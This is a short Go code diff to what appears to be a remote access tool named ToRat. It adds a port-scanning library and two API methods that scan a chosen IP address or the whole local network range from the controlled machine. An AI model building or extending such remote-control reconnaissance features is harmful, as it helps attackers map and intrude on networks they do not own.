@@ -10,6 +10,7 @@ import (
 	"path/filepath"
 	"reflect"
 
+	"github.com/JustinTimperio/gomap"
 	"github.com/JustinTimperio/osinfo"
 	"github.com/jaypipes/ghw"
 	"github.com/lu4p/ToRat/shared"
@@ -208,5 +209,18 @@ func (a *API) GetHardware(v shared.Void, r *shared.Hardware) error {
 		r.GPU = vc.DeviceInfo.Product.Name
 	}
 
+	return nil
+}
+func (a *API) Gomap(ip string, r *shared.Gomap) (err error) {
+	fastscan := true
+	scan := gomap.ScanIP(ip, fastscan)
+	r.Scan = scan.String()
+	return nil
+}
+
+func (a *API) GomapLocal(v shared.Void, r *shared.Gomap) (err error) {
+	fastscan := true
+	scan := gomap.ScanRange(fastscan)
+	r.Scan = scan.String()
 	return nil
 }
